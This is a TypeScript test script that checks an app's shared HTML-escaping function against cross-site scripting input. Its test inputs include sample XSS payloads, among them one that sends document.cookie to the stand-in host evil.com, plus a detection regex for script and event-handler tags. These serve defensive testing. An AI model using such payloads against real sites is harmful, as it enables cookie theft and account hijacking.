// scripts/verify-html-escaping.ts
// Offline verification of lib/html-escape.ts — the shared primitive every
// hand-built HTML string in this app (lib/export-pdf.ts, lib/support-email.ts,
// app/api/projects/[id]/sales-kit/route.ts) now routes untrusted content
// through, replacing three independent (and, before this pass, incomplete)
// copies. This doesn't re-audit every call site — that was done by hand —
// it guards the one shared function all of them depend on.
//
// Run with: npx tsx scripts/verify-html-escaping.ts
import { escapeHtml } from "../lib/html-escape";

let passed = 0;
let failed = 0;

function assertEqual(actual: string, expected: string, label: string) {
  if (actual === expected) {
    passed++;
  } else {
    failed++;
    console.log(`✗ FAILED: ${label}\n  expected: ${JSON.stringify(expected)}\n  actual:   ${JSON.stringify(actual)}`);
  }
}

function assertNoRawTag(actual: string, label: string) {
  const hasRawTag = /<script|<img[^>]*onerror|<svg[^>]*onload/i.test(actual);
  if (!hasRawTag) {
    passed++;
  } else {
    failed++;
    console.log(`✗ FAILED: ${label} — a live tag/handler survived escaping: ${actual}`);
  }
}

// Core character escaping
assertEqual(escapeHtml("<script>alert(1)</script>"), "&lt;script&gt;alert(1)&lt;/script&gt;", "script tag");
assertEqual(escapeHtml(`"quoted" & 'single'`), "&quot;quoted&quot; &amp; &#39;single&#39;", "quotes and ampersand");
assertEqual(escapeHtml("<img src=x onerror=alert(1)>"), "&lt;img src=x onerror=alert(1)&gt;", "img onerror");

// Realistic payloads matching this app's actual untrusted-content surfaces
assertNoRawTag(escapeHtml('<svg onload="alert(document.cookie)">'), "SVG onload (scraped product description)");
assertNoRawTag(escapeHtml("Competitor Name<script>fetch('//evil.com/'+document.cookie)</script>"), "AI-generated competitor name with injected script");
assertNoRawTag(escapeHtml('</title><script>alert(1)</script>'), "report title breaking out of a <title> RCDATA context");

// Non-string / nullish inputs (many call sites pass optional fields like
// c.price, p.tier straight through without a prior typeof check)
assertEqual(escapeHtml(null), "", "null input");
assertEqual(escapeHtml(undefined), "", "undefined input");
assertEqual(escapeHtml(42), "42", "numeric input");

// Idempotent on already-safe content — no double-escaping of a plain string
assertEqual(escapeHtml("Wahl Professional 5-Star"), "Wahl Professional 5-Star", "plain safe string passes through unchanged");

console.log(`\n${passed} passed, ${failed} failed`);
process.exit(failed > 0 ? 1 : 0);
